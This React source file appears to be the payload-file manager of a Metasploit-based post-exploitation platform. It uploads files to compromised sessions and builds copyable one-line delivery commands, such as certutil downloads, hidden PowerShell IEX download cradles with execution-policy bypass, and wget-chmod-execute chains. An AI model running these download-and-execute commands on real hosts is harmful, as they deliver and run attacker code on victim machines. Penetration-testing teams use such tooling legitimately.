import React, { Fragment, memo, useImperativeHandle, useState } from 'react';
import moment from 'moment';
import { formatMessage, useRequest } from 'umi';
import { deleteMsgrpcFileMsfAPI, getMsgrpcFileMsfAPI, postPostmodulePostModuleActuatorAPI } from '@/services/apiv1';
import '@ant-design/compatible/assets/index.css';
import { Button, Card, Col, message, Modal, Row, Space, Table, Tag, Upload } from 'antd';
import { CopyOutlined, SyncOutlined, UploadOutlined } from '@ant-design/icons';
import copy from 'copy-to-clipboard';
import styles from './FileMsf.less';
import { getToken } from '@/utils/authority';
import { Downheight } from '@/utils/utils';

String.prototype.format = function() {
  let args = arguments;
  return this.replace(/\{(\d+)\}/g, function(m, i) {
    return args[i];
  });
};

const { Dragger } = Upload;
const fileMsfUploadPath = '/api/v1/msgrpc/filemsf/?';
const webHost = location.hostname + (location.port ? `:${location.port}` : '');

const downloadFileWayDetail = item => {
  const download_router = '/api/v1/d/?en=';
  const download_url = `${location.protocol}//${webHost}${download_router}${item.enfilename}`;

  const filename = item.name;
  const data = [
    {
      key: '0',
      name: '浏览器下载',
      cmd: `${download_url}`,
    },
    {
      key: '1',
      name: 'certutil下载',
      cmd: `cmd.exe /c certutil -urlcache -split -f ${download_url} C:\\ProgramData\\${filename}`,
    },
    {
      key: '2',
      name: 'powershell下载',
      cmd: `cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('${download_url}','${filename}');`,
    },
    {
      key: '3',
      name: 'powershell内存执行',
      cmd: `cmd.exe /c powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('${download_url}');"`,
    },
    {
      key: '4',
      name: 'certutil下载执行exe',
      cmd: `cmd.exe /c certutil -urlcache -split -f ${download_url} C:\\ProgramData\\${filename} && C:\\ProgramData\\${filename}`,
    },
    {
      key: '5',
      name: 'powershell下载执行exe',
      cmd: `cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('${download_url}','${filename}');start-process ${filename}`,
    },
    {
      key: '6',
      name: 'linux下载',
      cmd: `wget -O ${filename} --no-check-certificate ${download_url}`,
    },
    {
      key: '7',
      name: 'linux下载执行elf',
      cmd: `wget -O ${filename} --no-check-certificate ${download_url} && chmod 755 ${filename} && ./${filename} `,
    },
  ];

  const columns = [
    {
      title: '操作',
      dataIndex: 'name',
      key: 'key',
      width: 160,
    },
    {
      title: '命令',
      dataIndex: 'cmd',
      ellipsis: true,
    },
    {
      title: 'Action',
      key: 'action',
      width: 100,
      render: (text, record) => (
        <Button
          block
          icon={<CopyOutlined/>}
          onClick={() => {
            copy(record.cmd);
            message.success(formatMessage({ id: 'app.response.copytoclipboard' }));
          }}
        >
          复制
        </Button>
      ),
    },
  ];

  Modal.info({
    icon: null,
    className: 'styles.oneClickDownload',
    bodyStyle: { padding: '0px 0px 0px 0px' },
    mask: false,
    width: '60vw',
    content: <Table size="small" columns={columns} dataSource={data} pagination={false}/>,
    okText: '关闭',
    onOk() {
    },
  });
};

const FileMsf = props => {
  console.log('FileMsf');
  const [msfUploading, setMsfUploading] = useState(false);
  const [fileMsfListActive, setFileMsfListActive] = useState([]);

  useImperativeHandle(props.onRef, () => {
    return {
      updateData: () => {
        listFileMsfReq.run();
      },
    };
  });
  const initListFileMsfReq = useRequest(getMsgrpcFileMsfAPI, {
    onSuccess: (result, params) => {
      setFileMsfListActive(result);
    },
    onError: (error, params) => {
    },
  });

  const listFileMsfForViewReq = useRequest(getMsgrpcFileMsfAPI, {
    manual: true,
    onSuccess: (result, params) => {
      if (result.type === 'img') {
        Modal.info({
          icon: null,
          bodyStyle: { padding: '0 0 0 0' },
          mask: false,
          width: '80vw',
          content: <img style={{ width: '100%' }} src={`data:image/png;base64,${result.data}`}/>,
          okText: '关闭',
          onOk() {
          },
        });
      } else {
        Modal.info({
          icon: null,
          style: {
            top: 40,
            padding: '0px 0px 0px 0px',
          },
          // bodyStyle: { padding: '0 0 0 0' },
          mask: false,
          width: '70vw',
          content: (
            <Fragment>
              <pre
                style={{
                  width: '100%',
                  maxHeight: '60vh',
                }}
              >
                {atob(result.data)}
              </pre>
              <Row>
                <Button
                  onClick={() => {
                    copy(atob(result.data));
                    message.success(formatMessage({ id: 'app.response.copytoclipboard' }));
                  }}
                >
                  拷贝到剪切板
                </Button>
              </Row>
            </Fragment>
          ),
          okText: '关闭',
          onOk() {
          },
        });
      }
    },
    onError: (error, params) => {
    },
  });

  const listFileMsfForView = name => {
    listFileMsfForViewReq.run({ name, action: 'view' });
  };

  const listFileMsfForDownloadReq = useRequest(getMsgrpcFileMsfAPI, {
    manual: true,
    onSuccess: (result, params) => {
    },
    onError: (error, params) => {
    },
  });

  const listFileMsfForDownload = name => {
    listFileMsfForViewReq.run({ name });
  };

  const listFileMsfReq = useRequest(getMsgrpcFileMsfAPI, {
    manual: true,
    onSuccess: (result, params) => {
      setFileMsfListActive(result);
    },
    onError: (error, params) => {
    },
  });

  const createFileMsfUploadOnChange = info => {
    if (info.file.status === 'uploading' && msfUploading === false) {
      setMsfUploading(true);
    }
    if (info.file.status === 'done') {
      if (200 <= info.file.response.code < 300) {
        message.success(info.file.response.message);
        listFileMsfReq.run();
      } else {
        message.warning(info.file.response.message);
      }
      setMsfUploading(false);
    } else if (info.file.status === 'error') {
      setMsfUploading(false);
      message.error(`${info.file.name} 上传失败.`);
    }
  };

  const destoryFileMsfReq = useRequest(deleteMsgrpcFileMsfAPI, {
    manual: true,
    onSuccess: (result, params) => {
      listFileMsfReq.run();
    },
    onError: (error, params) => {
    },
  });

  return (
    <Fragment>
      <Row
        style={{
          marginTop: -16,
        }}
        gutter={0}
      >
        <Col span={6}>
          <Dragger
            name="file"
            action={fileMsfUploadPath}
            headers={{ Authorization: `Token ${getToken()}` }}
            onChange={createFileMsfUploadOnChange}
            showUploadList={false}
            loading={msfUploading}
          >
            <UploadOutlined/> 拖拽文件到此处上传
          </Dragger>
        </Col>
        <Col span={18}>
          <Button
            block
            icon={<SyncOutlined/>}
            onClick={() => listFileMsfReq.run()}
            loading={
              listFileMsfReq.loading ||
              listFileMsfForDownloadReq.loading ||
              listFileMsfForViewReq.loading ||
              msfUploading
            }
          >
            刷新
          </Button>
          <Table
            className={styles.filesTable}
            scroll={{ y: 'calc({0} - 32px)'.format(Downheight) }}
            size="small"
            bordered
            pagination={false}
            rowKey="id"
            columns={[
              {
                title: '文件名',
                dataIndex: 'name',
                key: 'name',
                render: (text, record) => <span>{record.name}</span>,
              },
              {
                title: '大小',
                dataIndex: 'format_size',
                key: 'format_size',
                width: 96,
              },
              {
                title: '修改时间',
                dataIndex: 'mtime',
                key: 'mtime',
                width: 120,
                render: (text, record) => (
                  <Tag color="cyan">{moment(record.mtime * 1000).format('YYYY-MM-DD HH:mm')}</Tag>
                ),
              },
              {
                title: '操作',
                dataIndex: 'operation',
                width: 224,
                render: (text, record) => (
                  <div style={{ textAlign: 'center' }}>
                    <Space size="middle">
                      {record.size <= 1024 * 1024 ? (
                        <Fragment>
                          <a
                            style={{ color: 'green' }}
                            onClick={() => listFileMsfForView(record.name)}
                          >
                            查看
                          </a>
                        </Fragment>
                      ) : (
                        <Fragment>
                          <a style={{ visibility: 'Hidden' }}>占位</a>
                        </Fragment>
                      )}
                      <a onClick={() => listFileMsfForDownload(record.name)}>下载</a>
                      <a style={{ color: '#faad14' }} onClick={() => downloadFileWayDetail(record)}>
                        一句话下载
                      </a>
                      <a onClick={() => destoryFileMsfReq.run(record)} style={{ color: 'red' }}>
                        删除
                      </a>
                    </Space>
                  </div>
                ),
              },
            ]}
            dataSource={fileMsfListActive}
          />
        </Col>
      </Row>
    </Fragment>
  );
};
export const FileMsfMemo = memo(FileMsf);

export const FileMsfModal = props => {
  const { hostAndSessionActive, dirpath } = props;
  const [msfUploading, setMsfUploading] = useState(false);
  const [fileMsfListActive, setFileMsfListActive] = useState([]);
  const fileMsfUploadPath = '/api/v1/msgrpc/filemsf/?';

  const initListFileMsfReq = useRequest(getMsgrpcFileMsfAPI, {
    onSuccess: (result, params) => {
      setFileMsfListActive(result);
    },
    onError: (error, params) => {
    },
  });

  const listFileMsfReq = useRequest(getMsgrpcFileMsfAPI, {
    manual: true,
    onSuccess: (result, params) => {
      setFileMsfListActive(result);
    },
    onError: (error, params) => {
    },
  });

  const listFileMsfForDownloadReq = useRequest(getMsgrpcFileMsfAPI, {
    manual: true,
    onSuccess: (result, params) => {
    },
    onError: (error, params) => {
    },
  });

  const createPostModuleActuatorReq = useRequest(postPostmodulePostModuleActuatorAPI, {
    manual: true,
    onSuccess: (result, params) => {
    },
    onError: (error, params) => {
    },
  });

  const destoryFileMsfReq = useRequest(deleteMsgrpcFileMsfAPI, {
    manual: true,
    onSuccess: (result, params) => {
      listFileMsfReq.run();
    },
    onError: (error, params) => {
    },
  });

  const createFileMsfUploadOnChange = info => {
    if (info.file.status === 'uploading' && msfUploading === false) {
      setMsfUploading(true);
    }
    if (info.file.status === 'done') {
      if (200 <= info.file.response.code < 300) {
        message.success(info.file.response.message);
        listFileMsfReq.run();
      } else {
        message.warning(info.file.response.message);
      }
      setMsfUploading(false);
    } else if (info.file.status === 'error') {
      setMsfUploading(false);
      message.error(`${info.file.name} 上传失败.`);
    }
  };

  return (
    <Fragment>
      <Card
        style={{
          marginTop: -12,
          marginLeft: -16,
          marginRight: -16,
        }}
        bordered
        bodyStyle={{ padding: '0px 0px 0px 0px' }}
      >
        <Table
          className={styles.filesTableModal}
          loading={listFileMsfReq.loading || listFileMsfForDownloadReq.loading}
          size="small"
          bordered
          pagination={false}
          rowKey="id"
          columns={[
            {
              title: '文件名',
              dataIndex: 'name',
              key: 'name',
              render: (text, record) => <span>{record.name}</span>,
            },
            {
              title: '大小',
              dataIndex: 'format_size',
              key: 'format_size',
              width: 96,
            },
            {
              title: '修改时间',
              dataIndex: 'mtime',
              key: 'mtime',
              width: 120,
              render: (text, record) => (
                <Tag color="cyan">{moment(record.mtime * 1000).format('YYYY-MM-DD HH:mm')}</Tag>
              ),
            },
            {
              title: '操作',
              dataIndex: 'operation',
              width: 176,
              render: (text, record) => (
                <div style={{ textAlign: 'center' }}>
                  <Space size="middle">
                    <a
                      style={{ color: 'green' }}
                      onClick={() =>
                        createPostModuleActuatorReq.run({
                          ipaddress: hostAndSessionActive.ipaddress,
                          loadpath: 'MODULES.FileSessionUploadModule',
                          sessionid: hostAndSessionActive.session.id,
                          custom_param: JSON.stringify({
                            SESSION_DIR: dirpath,
                            MSF_FILE: record.name,
                          }),
                        })
                      }
                    >
                      上传到目标
                    </a>

                    <a onClick={() => listFileMsfForDownloadReq.run({ name: record.name })}>下载</a>

                    <a
                      onClick={() => destoryFileMsfReq.run({ name: record.name })}
                      style={{ color: 'red' }}
                    >
                      删除
                    </a>
                  </Space>
                </div>
              ),
            },
          ]}
          dataSource={fileMsfListActive}
        />
      </Card>
      <Row
        style={{
          // marginTop: 4,
          marginLeft: -16,
          marginRight: -16,
          marginBottom: -12,
        }}
        gutter={1}
      >
        <Col span={16}>
          <Dragger
            name="file"
            action={fileMsfUploadPath}
            headers={{ Authorization: `Token ${getToken()}` }}
            onChange={createFileMsfUploadOnChange}
            loading={msfUploading}
            // showUploadList={false}
            showUploadList={{
              showRemoveIcon: true,
              showPreviewIcon: false,
              showDownloadIcon: false,
            }}
          >
            <UploadOutlined/> 拖拽文件到此处上传
          </Dragger>
        </Col>
        <Col span={8}>
          <Button
            block
            style={{ height: 64 }}
            icon={<SyncOutlined/>}
            onClick={() => listFileMsfReq.run()}
            loading={
              listFileMsfReq.loading ||
              listFileMsfForDownloadReq.loading ||
              createPostModuleActuatorReq.loading
            }
          >
            刷新
          </Button>
        </Col>
      </Row>
    </Fragment>
  );
};

export default FileMsf;
